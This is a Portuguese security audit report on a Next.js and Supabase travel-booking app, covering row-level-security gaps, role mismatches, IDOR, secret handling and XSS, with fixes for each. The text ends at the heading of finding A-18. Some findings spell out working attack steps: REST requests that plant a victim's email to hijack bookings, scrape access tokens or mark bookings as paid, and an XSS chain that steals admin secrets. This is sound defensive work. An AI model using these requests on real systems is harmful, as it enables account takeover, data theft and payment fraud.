# Relatório de Auditoria de Segurança — RW Turismo

> **STATUS (2026-08-30): correções P1 e P2 APLICADAS e verificadas.**
> Ver [§9 — O que foi implementado](#9-o-que-foi-implementado). O corpo do
> relatório abaixo descreve os achados **como estavam** no momento da auditoria;
> foi mantido como está para servir de registro do que existia e do porquê.

**Data:** 2026-08-30
**Escopo:** `project-src/rw-turismo/` (aplicação Next.js) + `supabase/` (schema, RLS, migrations) + `.github/workflows/` + `vercel.json`
**Método:** 60 agentes em duas rodadas — 8 auditores por categoria/lente e 52 céticos independentes, cada um instruído a **refutar** um achado específico relendo o arquivo. Todo achado abaixo foi ainda conferido manualmente por mim, arquivo por arquivo.

---

## 1. Stack detectada e como cada categoria foi mapeada

| Item | O que este projeto usa |
|---|---|
| Linguagem / framework | TypeScript + **Next.js 15.5 Pages Router** (`src/pages/api/**` = handlers) |
| Banco / "ORM" | Supabase (PostgREST). **Não há ORM** — o cliente Supabase fala direto com o banco, inclusive **a partir do navegador** |
| Auth | Supabase Auth via `@supabase/ssr` (cookies) |
| Isolamento de dados | **RLS do PostgreSQL** — `supabase/rls.sql` (958 linhas, ~106 policies) + `supabase/schema.sql` (2983 linhas, 31 tabelas) |
| Camadas de autorização | 1) `src/middleware.ts` (edge, `/admin/*`) · 2) `requireStaff()` em `src/lib/server/adminAuth.ts` (rotas de API) · 3) RLS (sempre) · 4) `AdminGuard.tsx` (só cosmético) |
| Frontend | React 18.3 + Tailwind |
| Deploy / CI | Vercel (`vercel.json`, 2 crons) + GitHub Actions (`ci.yml`: lint/build/vitest + pgTAP) |
| Pagamentos | Stripe + InfinitePay |

**Como cada categoria da auditoria foi traduzida para esta stack:**

1. **Banco sem tranca** → RLS ausente ou permissiva. Crítico aqui porque `src/lib/*/client.ts` consultam o Supabase **do navegador com a anon key** (que é pública por design). Nesses caminhos **o RLS é a única defesa** — não existe servidor no meio.
2. **Permissão definida no navegador** → cruzei o mapa `ROUTE_ROLES` (`src/lib/auth/roles.ts`) com (a) o `middleware.ts`, (b) o `requireStaff` de cada rota de API e (c) **a policy de RLS da tabela** — porque no caminho (c) o "backend" é o Postgres.
3. **IDOR** → percorri os **23 handlers**, um a um, com atenção especial a `createSupabaseAdminClient()` (service role — **ignora todo o RLS**).
4. **Chaves expostas** → varredura por padrões de chave real no código, configs, CI, docs, n8n, HTML solto e **histórico do git**; mais análise dos defaults e da validação de startup.
5. **XSS** → `dangerouslySetInnerHTML`, `res.write`, `srcDoc`, renderização de markdown, URLs de banco em `href`/`src`, e HTML de e-mail transacional no backend. Os vetores de markdown foram **testados de verdade**, executando o renderizador (ver 4.5).

---

## 2. Resumo executivo

| Severidade | Qtd. | Achados |
|---|---|---|
| 🔴 Crítica | 1 | A-01 |
| 🟠 Alta | 2 | A-07, A-08 |
| 🟡 Média | 9 | A-02, A-03, A-09, A-10, A-14, A-18, A-19, A-20, A-21 |
| 🔵 Baixa | 6 | A-04, A-05, A-11, A-12, A-13, A-16 |
| ⚪ Informativa | 3 | A-06, A-15, A-17 |
| **Total acionável** | **21** | |
| ✅ Pontos fortes verificados | 100 | |
| ❌ Achados descartados na verificação | 6 | §5 |

```
CRÍTICA  ██                                        1
ALTA     ████                                      2
MÉDIA    ██████████████████                        9
BAIXA    ████████████                              6
INFORM.  ██████                                    3
```

Por categoria:

```
1. Banco sem tranca (RLS)      ███████████████        6
2. Permissão no navegador      ██████████████████     7
3. IDOR                        ████                   2
4. Chaves expostas             ████                   2   (nenhuma chave real hardcoded)
5. XSS / input sem tratamento  ████████████           4
```

**A leitura de uma frase:** a arquitetura de segurança deste projeto é **muito acima da média** — RLS em 31/31 tabelas, quatro camadas de autorização, webhooks com verificação servidor-a-servidor, documentos de passageiro em bucket privado com trigger por coluna. Os problemas não são de descuido geral; são **três brechas pontuais e específicas** num desenho que, no resto, foi feito com cuidado incomum.

---

## 3. Pontos fortes (o que está protegido, com evidência)

Registrados aqui porque provam a cobertura da auditoria — cada um foi verificado lendo o arquivo.

| # | O que está certo | Evidência |
|---|---|---|
| F1 | **RLS em 31 de 31 tabelas.** Nenhuma tabela destrancada, nenhum `disable row level security` em toda a história do banco | `supabase/rls.sql:119-128` + demais `enable row level security`; varredura completa sem nenhum `disable` |
| F2 | **Só dois `using (true)` no repositório inteiro**, ambos em dado de vitrine | `rls.sql:448` (site_settings) e `rls.sql:471` (blog_tags) |
| F3 | **Cliente não insere nem confirma reserva.** Não existe policy de INSERT em `bookings` para ninguém — criar e confirmar é exclusivo do service role | `rls.sql:210-211` (o `drop policy` sem `create` correspondente, com o porquê escrito) |
| F4 | **Documento de passageiro é server-only por trigger**, no INSERT *e* no UPDATE — fecha o buraco que uma policy sozinha deixaria | `schema.sql:2749-2784`, `passengers_protect_document_columns()` |
| F5 | **Bucket `booking-documents` é privado de verdade**, sem policy de escrita, leitura restrita a admin/operacoes e ao dono | `schema.sql:1944-1955` (bucket `public = false`) + `rls.sql:930-958` |
| F6 | **`financeiro` foi deliberadamente deixado sem ler `passengers`**, com a justificativa escrita no código — minimização de dado pessoal aplicada, não só declarada | `rls.sql:745-748` |
| F7 | **`access_token` gerado no banco** por trigger, 24 bytes aleatórios, índice único — não derivável | `schema.sql:1577-1593` |
| F8 | **Acesso de convidado roda só no servidor**, com service role, filtrando `id` **e** `access_token` juntos, e recusa token com menos de 32 caracteres | `src/lib/bookings/guestAccess.ts:24-35` |
| F9 | **Rota sem login devolve o mínimo de dado pessoal** e usa a *mesma* resposta 404 para "não existe" e "token errado" | `src/pages/api/bookings/[id]/guest.ts:42-56` |
| F10 | **Todas as funções `SECURITY DEFINER` fixam `set search_path`** — 50+ definições, nenhuma exceção | `rls.sql:6-11, 29-34, 43-48, 53-58, 63-71`; `schema.sql` (17/17) |
| F11 | **Toda RPC de dinheiro/vaga é revogada de `public`** e concedida só a `service_role` | `rls.sql:22-24, 73-87`; `migrations/20260810000000:387-388` |
| F12 | **As RPCs privilegiadas checam o papel do chamador dentro do banco**, sem confiar no service role | `schema.sql:1019-1022` (`admin_create_booking`) |
| F13 | **Autopromoção a admin está barrada por duas defesas independentes**: `WITH CHECK role = 'customer'` + trigger | `rls.sql:149-154` e `rls.sql:89-117` |
| F14 | **`integration_secrets` é alcançável apenas por `is_admin()`** — policy única, sem brecha para outro papel | `rls.sql:565-567` |
| F15 | **Middleware protege o painel no servidor, fail-closed, sem depender de JavaScript** | `src/middleware.ts:49-86` (o `catch` da linha 82 nega o acesso) |
| F16 | **Crons são fail-closed**: sem `CRON_SECRET` configurado, o endpoint recusa qualquer chamada | `api/cron/daily.ts:13-16` e `api/cron/expire-bookings.ts:12-15` |
| F17 | **Webhook InfinitePay não confia no corpo recebido**: valor e status vêm de verificação servidor-a-servidor, com amarra de slug contra replay e trava de idempotência | `api/payments/webhook/infinitepay/[token].ts:64-99, 155-175` |
| F18 | **Comparação de token do webhook em tempo constante** | mesmo arquivo, `:32-43` |
| F19 | **IDOR de documento de passageiro fechado corretamente**: o passageiro é buscado com `.eq(id).eq(booking_id)`, e o `confirm` ainda exige que o arquivo exista mesmo no Storage | `src/lib/bookings/passengerDocuments.ts:91-96, 148-179` |
| F20 | **`requireStaff` é por papel, não por "é da equipe"**, e valida `active` | `src/lib/server/adminAuth.ts:13-43` |
| F21 | **Markdown com HTML cru desligado** — `<script>` e `<img onerror>` são escapados (confirmado executando o renderizador) | `src/components/MarkdownContent.tsx:36` (`disableParsingRawHTML: true`) |
| F22 | **Os 6 usos de `dangerouslySetInnerHTML` são todos JSON-LD** com `JSON.stringify(...).replace(/</g,"\\u003c")` — seguros | `blog/[slug].tsx:28-29`, `products/[slug].tsx:434-437`, `home/EditableHome.tsx:51` |
| F23 | **Nenhuma chave real hardcoded** em código, config, CI, docs ou no histórico do git | ver §4.4 |
| F24 | **Catálogo público não expõe custo, margem nem fornecedor** — só preço de venda | `schema.sql:35-62` |
| F25 | **Zero RPC exposta ao anônimo** | varredura de `grant execute ... to anon`: nenhuma ocorrência |

---

## 4. Achados detalhados — arquivo por arquivo, linha por linha

### 4.1 · Categoria 1 — Banco sem tranca (isolamento de dono)

---

#### 🔴 **A-01 · CRÍTICA — Sequestro de reserva por plantio de e-mail no perfil**

**Arquivo:** `supabase/rls.sql:140-144`
**Cadeia:** `src/pages/api/bookings/create-pending.ts:73` → `src/lib/auth/customerAccount.ts:132-137`

```sql
-- supabase/rls.sql:139-144
drop policy if exists "profiles_insert_own_customer" on public.users_profiles;
create policy "profiles_insert_own_customer"
on public.users_profiles
for insert
to authenticated
with check (user_id = auth.uid() and role = 'customer');
```

O `WITH CHECK` amarra `user_id` e `role`, mas **não amarra a coluna `email`**. Nada compara com `auth.jwt() ->> 'email'`.

E o e-mail é a **chave de identidade** do cliente no checkout sem cadastro:

```ts
// src/lib/auth/customerAccount.ts:131-137
    const { data } = await admin
      .from("users_profiles")
      .select("id, user_id")
      .eq("email", email)
      .maybeSingle();
    if (data?.user_id) return data.user_id;   // <-- devolve o dono da linha achada pelo e-mail
```

**Por que é explorável (passo a passo):**

1. O perfil é criado **do navegador** (`src/lib/auth/profile.ts:93-100` usa `createSupabaseBrowserClient`), logo o `authenticated` tem privilégio de INSERT na tabela pelo PostgREST e o RLS é a única barreira.
2. O atacante cria conta com um e-mail descartável e obtém um JWT `authenticated`.
3. Faz `POST /rest/v1/users_profiles` com `{"user_id":"<uuid dele>","role":"customer","email":"vitima@dominio.com"}`. Passa no `WITH CHECK`; passa no `unique(email)` porque a vítima ainda não tem linha; e **o trigger `prevent_customer_profile_identity_changes` não roda — ele é `BEFORE UPDATE`** (`rls.sql:114-117`), não cobre INSERT.
4. Quando a vítima compra sem cadastro informando o e-mail dela, `/api/bookings/create-pending` (rota **pública**, sessão explicitamente opcional em `create-pending.ts:45-52`) chama `resolveCustomerUserId`, que acha a linha plantada e devolve **o `user_id` do atacante**.
5. A reserva nasce com `bookings.user_id` = atacante.

**Impacto:** a partir daí o atacante lê, pelo navegador com a anon key, tudo que as policies consideram "dele":

- `bookings_select_own_or_admin` (`rls.sql:215-219`) → reserva inteira: `customer_name`, `customer_email`, `customer_phone`, `total_amount` e **o `access_token`** (`src/lib/bookings/client.ts:9-11` faz `select("*")`)
- `passengers_select_own_booking_or_admin` (`rls.sql:270-283`) → `full_name`, `document`, `birth_date` dos passageiros, **incluindo menores**
- `payments_select_own_or_admin` (`rls.sql:241-244`) → os pagamentos

Efeito colateral: a vítima fica **trancada para fora do site**, porque a criação do perfil dela bate no `unique(email)` (`profile.ts:104-114`).

**Condições de explorabilidade:** a vítima ainda não pode ter linha em `users_profiles` com aquele e-mail — ou seja, **qualquer cliente novo**. O cadastro é aberto. Não há trigger em `auth.users` que crie o perfil automaticamente, então o atacante controla o momento.

**Verificação independente:** confirmei os 6 elos. A policy é a única definição de INSERT em toda a pasta `supabase/` (grep exaustivo). Os únicos triggers em `users_profiles` são `set_users_profiles_updated_at` (`schema.sql:318`) e o `BEFORE UPDATE` citado. As constraints (`schema.sql:16-33`) são `unique(user_id)`, `unique(email)`, `role_check` e `email_lowercase_check` — nenhuma amarra o e-mail ao dono. Não há revoke/grant de coluna sobre a tabela.

**Correção:**
```sql
-- opção mínima
with check (
  user_id = auth.uid()
  and role = 'customer'
  and (email is null or email = lower(auth.jwt() ->> 'email'))
);
-- opção robusta (recomendada): remover o INSERT do cliente e criar o perfil
-- por trigger AFTER INSERT em auth.users, onde o e-mail já vem verificado.
```
Complementarmente, estender `prevent_customer_profile_identity_changes` para `BEFORE INSERT OR UPDATE`.

---

#### 🟡 **A-02 · MÉDIA — `survey_responses`: o INSERT anônimo não trava a coluna `approved`**

**Arquivo:** `supabase/rls.sql:598-600`

```sql
create policy "survey_responses_public_insert" on public.survey_responses
for insert to anon, authenticated
with check (rating >= 0 and rating <= 10);
```

O `WITH CHECK` valida só a nota. A coluna `approved` (`schema.sql:1868`, `boolean not null default false`) fica livre — quem insere pode mandar `approved: true`.

**Por que é explorável:** `src/lib/surveys/client.ts:11-16` insere pela anon key. Um depoimento com `approved: true` entra direto na home (`src/lib/content/server.ts:29-62`), sem passar pela moderação que a coluna existe para impor.

**Condições:** exige um `booking_id` válido e ainda sem resposta — a constraint `unique(booking_id)` (`schema.sql:1872`) limita a uma inserção por reserva. Na prática: **quem comprou uma vez publica um depoimento auto-aprovado**. O texto é renderizado pelo React (escapado), então é *defacement* / injeção de conteúdo, não XSS.

**Correção:** `with check (rating between 0 and 10 and approved = false)`.

---

#### 🟡 **A-03 · MÉDIA — `access_token` mora na mesma linha que todo staff lê**

**Arquivos:** `supabase/rls.sql:726-730` (`bookings_operacoes_all`) e `rls.sql:732-736` (`bookings_financeiro_select`)

RLS no Postgres **não filtra coluna**, e não existe nenhum `revoke`/`grant` de coluna sobre `public.bookings`. Logo, qualquer usuário com papel `operacoes` ou `financeiro` faz, do navegador:

```
GET /rest/v1/bookings?select=id,access_token
```

e recebe **o token de todas as reservas**.

**Por que importa (e por que não é redundante):** essas roles já leem a reserva. O ganho do atacante não é a leitura — é que o `access_token` **funciona sem sessão nenhuma**, pela rota pública `/api/bookings/[id]/guest`. Um funcionário que raspa os tokens antes de sair mantém acesso às reservas **depois de ter a conta desativada**, e os tokens podem ser repassados a terceiros. O token não expira nem é rotacionado.

Agrava: `src/lib/server/notifications.ts:162-166` grava o link **com o token** em `notification_log.body`, tabela lida por toda a equipe (`rls.sql:912-916`) e sem expiração — então o segredo entra também em qualquer backup ou dump do log.

**Correção:** mover `access_token` para tabela própria lida só por service role, ou `revoke (access_token) on public.bookings from authenticated` mantendo o resto. Mascarar o token no `body` do log e definir retenção.

---

#### 🔵 **A-04 · BAIXA — `waitlist` e `leads`: INSERT anônimo não amarra `user_id`**

**Arquivos:** `supabase/rls.sql:522-524` e `rls.sql:591-593`

O `WITH CHECK` não amarra `user_id` a `auth.uid()`. Um anônimo grava uma linha **em nome de outro usuário**: em `waitlist`, a policy de leitura `waitlist_select_own_or_admin` (`rls.sql:526-529`) faz a vítima ver na conta dela uma inscrição que nunca fez. Em `leads`, ficam livres também `position`, `waitlist_id` e `deleted_at` — dá para injetar lead no topo do funil de CRM.

**Correção:** `with check (user_id is null or user_id = auth.uid())`, e restringir as colunas de controle a `default`.

---

#### 🔵 **A-05 · BAIXA — `newsletter_subscribers` vira oráculo de "este e-mail é assinante?"**

**Arquivo:** `supabase/rls.sql:491-492`

```sql
create policy "newsletter_public_insert" on public.newsletter_subscribers
for insert to anon, authenticated with check (active = true and source in ('home', 'blog'));
```

O INSERT é aberto e a tabela tem `unique(email)`. O código de erro `23505` distingue "já existe" de "inserido" — enumeração de assinantes por tentativa.

**Correção:** inserir por RPC `SECURITY DEFINER` que devolva sempre a mesma resposta (upsert silencioso).

---

#### ⚪ **A-06 · INFORMATIVA — `site_settings` legível por `anon` com `using (true)`**

**Arquivo:** `supabase/rls.sql:448-449`

A tabela é um key/value genérico (`schema.sql:1450-1455`: `setting_key text`, `value jsonb`). Hoje **não vaza segredo** — as chaves realmente gravadas são identidade visual, WhatsApp e as etapas do funil de CRM (verificado em `src/pages/admin/settings*` e `src/lib/admin/crm.ts`). Fica registrado porque o formato é genérico: **a primeira pessoa que gravar um token aqui o publica para a internet**, sem nenhum aviso.

**Correção:** trocar por lista branca de chaves públicas — `using (setting_key in ('branding','whatsapp',...))`.

---

### 4.2 · Categoria 2 — Permissão definida no navegador

> **Nota de escopo importante.** Este projeto **não** tem o problema clássico da categoria. Existe `src/middleware.ts` (edge, fail-closed, `matcher: ["/admin","/admin/:path*"]`) e **todas as 11 rotas de `api/admin/**` chamam `requireStaff`/`requireAdmin` na entrada**. O `AdminGuard.tsx` é assumidamente cosmético, e o código diz isso (`AdminGuard.tsx:33-35`).
>
> O problema real desta categoria, aqui, é outro: **a maior parte das telas do `/admin` grava direto no Supabase pelo navegador** (`src/lib/admin/*.ts`, `src/lib/content/client.ts`). Nesse caminho não há servidor para checar papel — **a policy de RLS *é* o backend**. Os achados abaixo são divergências entre o papel que a UI exige e o papel que o Postgres exige.

---

#### 🟠 **A-07 · ALTA — `pages.custom_html`: o papel `conteudo` executa JavaScript na origem do site**

**Arquivos:** `src/pages/paginas/[slug].tsx:151-156` e `:38-55` · policy em `supabase/rls.sql:853-856`

```tsx
// src/pages/paginas/[slug].tsx:151-156 — HTML cru na origem do site
    if (page.custom_html && !page.custom_html_chrome) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.write(page.custom_html);
      res.end();
      return { props: {} };
    }
```

```tsx
// src/pages/paginas/[slug].tsx:39-54 — o outro caminho, também mesma origem
    <iframe
      className="block w-full border-0"
      ...
      srcDoc={html}          // <-- linha 51: SEM atributo sandbox
```

```sql
-- supabase/rls.sql:853-856 — quem pode escrever
create policy "pages_conteudo_all" on public.pages
for all to authenticated
using (public.has_staff_role(array['conteudo']))
with check (public.has_staff_role(array['conteudo']));
```

**Por que é explorável:** os dois caminhos rodam na **origem do site**. O comentário da linha 101 diz "landing isolada em iframe", mas **`srcdoc` sem `sandbox` herda a origem do pai** — não há isolamento nenhum. E a escrita nem passa por rota de API: `src/lib/content/client.ts:116-121` grava a coluna direto do navegador.

Cadeia de escalonamento **`conteudo` → `admin`**:

1. Um usuário com papel `conteudo` (o papel de menor privilégio da equipe — não vê caixa nem reservas) publica uma página com `custom_html` contendo script.
2. Qualquer visitante que abra `/paginas/<slug>` executa esse script na origem do site.
3. O script lê o token do Supabase no `localStorage` da vítima e chama a PostgREST em nome dela.
4. Se a vítima for um **admin**, o script exfiltra `integration_secrets` — **`stripe_secret_key`, `resend_api_key`, `uazapi_token`, `stripe_webhook_secret`**. A policy `integration_secrets_admin_all` está correta, mas ela autoriza *o token do admin*, e o script está usando exatamente esse token.

Agrava (mas não é causa raiz): `src/pages/admin/integracoes.tsx:133-135` faz `select("key, value, updated_at")` — **o valor em claro das chaves trafega para o navegador do admin**; o mascaramento existe só na renderização (`:226-227`).

**Condições:** exige uma conta com papel `conteudo` — hostil, comprometida ou de terceirizado. Para chegar às chaves, exige ainda que um admin visite a página. O primeiro passo (XSS em qualquer visitante) não tem pré-condição nenhuma.

**Correção:**
1. Curto prazo: `sandbox="allow-scripts allow-forms"` (sem `allow-same-origin`) no iframe da linha 51, e servir o caminho da linha 153 de um **subdomínio separado** (ou remover o modo sem chrome).
2. Restringir `custom_html` a `is_admin()` — uma policy `as restrictive` sobre a coluna, ou mover a coluna para tabela própria admin-only.
3. Parar de enviar `value` para o navegador em `integracoes.tsx`: devolver só `key`, `updated_at` e os 4 últimos caracteres, por rota de API.

---

#### 🟠 **A-08 · ALTA — `operacoes` marca reserva como PAGA direto na tabela, contornando as duas travas que reservam isso ao financeiro**

**Arquivo:** `supabase/rls.sql:726-730`

```sql
create policy "bookings_operacoes_all"
on public.bookings
for all to authenticated
using (public.has_staff_role(array['operacoes']))
with check (public.has_staff_role(array['operacoes']));
```

`for all`, sem restrição de coluna.

**Por que é explorável:** o projeto tem **duas** travas dizendo que só `admin`/`financeiro` confirmam dinheiro:

- `src/pages/api/admin/bookings/[id]/confirm-payment.ts:23` → `requireStaff(req, res, ["admin", "financeiro"])`
- o guard interno da RPC `admin_confirm_manual_payment` (`schema.sql:1150-1152`)

Ambas são contornáveis, porque `operacoes` não precisa passar por nenhuma delas: pelo console do navegador, com a própria sessão,

```
PATCH /rest/v1/bookings?id=eq.<uuid>   { "payment_status": "paid", "status": "confirmed" }
```

passa direto no RLS. O mesmo vale para `total_amount` — dá para zerar o valor de uma reserva.

**Condições:** exige uma conta de equipe com papel `operacoes` (insider). Não é alcançável por cliente nem anônimo.

**Correção:** trocar `for all` por policies separadas por comando e proteger as colunas financeiras com trigger — o projeto **já domina exatamente essa técnica** em `passengers_protect_document_columns()` (`schema.sql:2749-2784`); é replicar o padrão para `payment_status`, `status` e `total_amount`.

---

#### 🟡 **A-09 · MÉDIA — `product_dates_operacoes_update` contradiz o próprio comentário**

**Arquivo:** `supabase/rls.sql:695-702`

```sql
-- Operações ajusta a logística da saída (total de assentos) sem poder criar,
-- apagar ou reprecificar datas.
create policy "product_dates_operacoes_update"
on public.product_dates
for update to authenticated
using (public.has_staff_role(array['operacoes']))
with check (public.has_staff_role(array['operacoes']));
```

O comentário promete "sem reprecificar", mas a policy **não restringe coluna nenhuma**. `operacoes` altera `price` e `active` de qualquer saída — na UI, catálogo é de `conteudo` (`src/lib/auth/roles.ts:61`).

(A parte "sem criar, apagar" está correta: é `for update`, não `for all`.)

**Correção:** trigger que recuse alteração de `price`/`promotional_price` quando `staff_role() = 'operacoes'`.

---

#### 🟡 **A-10 · MÉDIA — `profiles_staff_select` usa `is_staff()`: `conteudo` lê a base inteira de clientes**

**Arquivo:** `supabase/rls.sql:651-655`

```sql
create policy "profiles_staff_select"
on public.users_profiles
for select
to authenticated
using (public.is_staff());
```

`is_staff()` é "qualquer papel de equipe". Na UI, `/admin/clients` é de `["admin","operacoes","financeiro"]` (`src/lib/auth/roles.ts:52`) — **`conteudo` não tem a tela**, mas tem a leitura: nome, e-mail, telefone e data de nascimento de toda a base.

**Correção:** `using (public.has_staff_role(array['admin','operacoes','financeiro']))`.

---

#### 🔵 **A-11 · BAIXA — `system_logs_staff_select` usa `is_staff()`, mas `/admin/logs` é admin-only**

**Arquivo:** `supabase/rls.sql:907-910`

Mesma divergência: a UI reserva os logs a `admin` (`roles.ts:82`); o banco entrega a trilha de auditoria completa a toda a equipe — inclusive `view_passenger_document`, que registra quem abriu documento de menor.

**Correção:** `using (public.is_admin())`.

---

#### 🔵 **A-12 · BAIXA — `site_settings`: escreve `conteudo`, mas a tela de CRM é de `operacoes`**

**Arquivos:** `supabase/rls.sql:846-850` (policy) e `src/lib/admin/crm.ts:49-6x` (escrita)

A mesma tabela guarda identidade visual **e** as etapas do funil de CRM. Quem grava, pelo RLS, é `conteudo`; quem abre `/admin/crm` é `["admin","operacoes"]`. Resultado: `operacoes` vê a tela e não consegue salvar; `conteudo` não vê a tela e consegue.

**Correção:** separar as chaves de CRM em tabela própria, ou adicionar `operacoes` à policy com filtro por `setting_key`.

---

#### 🔵 **A-13 · BAIXA — `/api/admin/integration-status` faz a checagem de papel na mão e ignora `active`**

**Arquivo:** `src/pages/api/admin/integration-status.ts:14-21`

```ts
  const { data: profile } = await supabase
    .from("users_profiles")
    .select("role")
    .eq("user_id", userData.user.id)
    .maybeSingle();
  if (profile?.role !== "admin") {
    return res.status(403).json({ error: "Acesso restrito." });
  }
```

É **o único** dos 23 handlers que não usa `requireStaff`. E `requireStaff` valida `active` (`adminAuth.ts:34`); esta checagem não. Um admin **desativado** continua entrando aqui — e as linhas `:44-55` usam a **chave viva do Stripe** para bater na API deles.

**Correção:** trocar por `const admin = await requireAdmin(req, res); if (!admin) return;`.

---

### 4.3 · Categoria 3 — IDOR

> **Cobertura:** os **23 handlers** foram lidos por inteiro. A tabela abaixo é a prova.

| Handler | Gate | Veredito |
|---|---|---|
| `api/admin/bookings/create.ts` | `requireStaff(["admin","operacoes"])` :25 | ✅ |
| `api/admin/bookings/[id]/cancel.ts` | `requireStaff(["admin","operacoes"])` :15 | ✅ |
| `api/admin/bookings/[id]/confirm-payment.ts` | `requireStaff(["admin","financeiro"])` :23 | ✅ (mas contornável pelo RLS — A-08) |
| `api/admin/bookings/[id]/rebook.ts` | `requireStaff(["admin","operacoes"])` :17 | ✅ |
| `api/admin/clients/import.ts` | `requireStaff(["admin"])` :56 | ✅ |
| `api/admin/departures/[id]/log-export.ts` | `requireStaff(["admin","operacoes"])` :21 | ✅ |
| `api/admin/integration-status.ts` | checagem manual :14-21 | 🔵 A-13 |
| `api/admin/passengers/[id]/document.ts` | `requireStaff(["admin","operacoes"])` :24 | ✅ |
| `api/admin/users/index.ts` | `requireAdmin` :21 | ✅ |
| `api/admin/users/[id]/index.ts` | `requireAdmin` :18 | ✅ |
| `api/admin/users/[id]/reset-password.ts` | `requireAdmin` :14 | ✅ |
| `api/bookings/[id]/documents.ts` | posse por sessão (`.eq("user_id")` :54-59) **ou** `access_token` :64-67 | ✅ |
| `api/bookings/[id]/guest.ts` | `findBookingByAccessToken` :40 + rate limit :27 | ✅ |
| `api/bookings/[id]/voucher.ts` | dono **ou** papel :39-50 | ✅ |
| `api/bookings/create-pending.ts` | público por desenho; rate limit :59 | 🟡 A-14 |
| `api/bookings/expire.ts` | sessão :33 + `booking.user_id !== user.id` :49 | ✅ |
| `api/bookings/quote.ts` | público por desenho; rate limit :35 | ✅ |
| `api/cron/daily.ts` | `CRON_SECRET` fail-closed :13-16 | ✅ |
| `api/cron/expire-bookings.ts` | `CRON_SECRET` fail-closed :12-15 | ✅ |
| `api/payments/create-checkout-session.ts` | dono do banco, nunca do corpo :51-65 | ✅ |
| `api/payments/providers.ts` | público por desenho (só diz quais meios existem) | ✅ |
| `api/payments/webhook.ts` | assinatura Stripe sobre o corpo cru | ✅ |
| `api/payments/webhook/infinitepay/[token].ts` | token em tempo constante :32-43 + verificação servidor-a-servidor :157 | ✅ |

**Nenhum IDOR clássico foi encontrado.** Os handlers que usam service role sempre fazem a checagem manual de posse no mesmo arquivo. Os dois achados desta categoria são de outra natureza:

---

#### 🟡 **A-14 · MÉDIA — Rota sem autenticação amarra a reserva à conta de outra pessoa só pelo e-mail informado**

**Arquivo:** `src/pages/api/bookings/create-pending.ts:41-78` + `src/lib/auth/customerAccount.ts:130-139`

É o **mesmo mecanismo do A-01, visto do outro lado**. Mesmo sem o plantio de perfil: qualquer anônimo informa o e-mail de um cliente **existente** e a reserva criada é atribuída à conta dele — aparece em `/account/bookings` da vítima, e a notificação (`notifications.ts:162-166`) vai para o e-mail/WhatsApp dela, com o link e o `access_token`.

Não é escalonamento de leitura (a reserva é do atacante), mas é **poluição de conta alheia e vetor de phishing com a marca da agência**.

**Correção:** exigir verificação do e-mail (magic link) antes de vincular a uma conta **já existente**; para e-mail novo, o fluxo atual está correto.

---

#### ⚪ **A-15 · INFORMATIVA — Chamador anônimo sobrescreve o telefone de um perfil sem dono**

**Arquivo:** `src/lib/auth/customerAccount.ts:164-176` (alcançado por `create-pending.ts:73`)

Na adoção de um perfil órfão, o `phone` informado na requisição sobrescreve o que a agência tinha cadastrado (`:171`). Um anônimo que saiba o e-mail de um contato importado troca o telefone dele na base — e passa a receber o WhatsApp das notificações.

**Correção:** só preencher `phone` quando a coluna estiver nula (`coalesce`), nunca sobrescrever.

---

### 4.4 · Categoria 4 — Chaves expostas

> **Resultado principal: nenhuma chave real hardcoded.** Varredura de alta entropia sobre a lista completa do `git ls-files` (não só `src/`) com os padrões `sk_live`/`sk_test`/`pk_*`/`whsec_`/`re_*`/JWT de 3 partes/`AIza`/`xox*`/`gh[pousr]_`/`BEGIN PRIVATE KEY`: **saída vazia**. Os únicos hits de `whsec_` são **placeholders textuais** — `docs/stripe-setup.md:40` (`STRIPE_INTERNAL_WEBHOOK_SECRET=whsec_...`) e o rótulo de UI em `src/pages/admin/integracoes.tsx:64`.
>
> **Histórico do git (93 commits, `--all`):** `-S "sk_live"` vazio · `-S "sk_test_"` vazio · `-S "eyJhbGciOiJIUzI1NiIs"` vazio · `-S "eyJ"` casa só `906f792`, e o diff mostra que são hashes `integrity: sha512-…` do `package-lock.json`, não JWTs · `-S "whsec_"` casa `4f21093` e `f87b498`, ambos os placeholders acima.
>
> **Demais verificações:** `.env.local` corretamente ignorado (`.gitignore:29-30,40` e raiz `:17-19`) e **não rastreado**. CI usa valores explicitamente `dummy` (`ci.yml:25-26`). `env.ts` nunca embute default — todo acesso passa por `requireEnv`, que lança se faltar. Os únicos `?? ""` / `|| ""` do projeto são sobre variáveis **públicas e não-secretas** (`NEXT_PUBLIC_GA_ID`, `NEXT_PUBLIC_SITE_URL`), com default de string vazia — não há padrão `${VAR:-valor-real}`. `quiz-feriado.html` limpo (único hit é um código de cor).

Sobram duas observações de desenho:

---

#### 🔵 **A-16 · BAIXA — Valores em claro das chaves de integração trafegam para o navegador do admin**

**Arquivo:** `src/pages/admin/integracoes.tsx:133-135` e `:226-227`

```ts
      const { data, error } = await supabase
        .from("integration_secrets")
        .select("key, value, updated_at");
```
```ts
  const mask = (row?: SecretRow) =>
    row ? `••••${row.value.slice(-4)}` : null;
```

O RLS está **correto** (só `is_admin()` — ponto forte F14). O problema é que o valor completo de `stripe_secret_key`, `resend_api_key` e `uazapi_token` chega ao navegador; o mascaramento é só de renderização. Consequência: as chaves ficam visíveis na aba Network, na memória da aba e em qualquer extensão instalada — e são o alvo final da cadeia A-07.

**Correção:** rota de API que devolva só `key`, `updated_at` e os 4 últimos caracteres. A escrita continua por rota de API com `requireAdmin`.

---

#### ⚪ **A-17 · INFORMATIVA — `docs/env.md` desatualizado**

**Arquivo:** `project-src/rw-turismo/docs/env.md:1-76`

Não documenta metade dos segredos que o código lê de fato (`CRON_SECRET` em `cron/daily.ts:13`, `UAZAPI_*`, `RESEND_*` em `secrets.ts:24-31`, o `gtag` em `analytics/gtag.ts:5`), e documenta uma variável morta (`:66-67`). Documentação de segredo desatualizada leva a deploy com variável faltando — e, no caso do `CRON_SECRET`, o cron falha em silêncio (fail-closed, 401).

---

### 4.5 · Categoria 5 — Inputs sem tratamento (XSS)

> **Nota:** o achado maior desta categoria é o **A-07** (`custom_html`), listado na categoria 2 por ser primariamente um escalonamento de privilégio. **Não existe biblioteca de sanitização no projeto** (`package.json:13-56`: sem `dompurify`, sem `sanitize-html`) — a segurança do conteúdo depende inteiramente do escape do React e dos defaults do `markdown-to-jsx`.

---

#### 🟡 **A-18 · MÉDIA — `javascript:` passa pelo MarkdownContent via link de referência e autolink**

**Arquivo:** `src/components/MarkdownContent.tsx:12-21` e `:34-42`

